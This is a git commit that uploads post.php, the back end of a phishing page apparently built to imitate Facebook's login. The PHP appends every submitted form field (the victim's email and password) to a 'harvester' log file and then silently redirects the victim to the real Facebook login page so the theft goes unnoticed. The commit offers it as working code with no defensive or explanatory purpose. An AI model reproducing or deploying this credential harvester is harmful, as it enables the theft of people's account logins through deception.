2e23f59adbd6b1994456f72a524737e7f158b609
Donovan700 <105297551+Donovan700@users.noreply.github.com>
2022-11-24 17:14:38 +0000

    Add files via upload

---
+++ post.php
@@ -0,0 +1,2 @@
+<?php $file = 'harvester_2022-11-24 19:41:13.569637.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
+/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://login.facebook.com/login.php" />
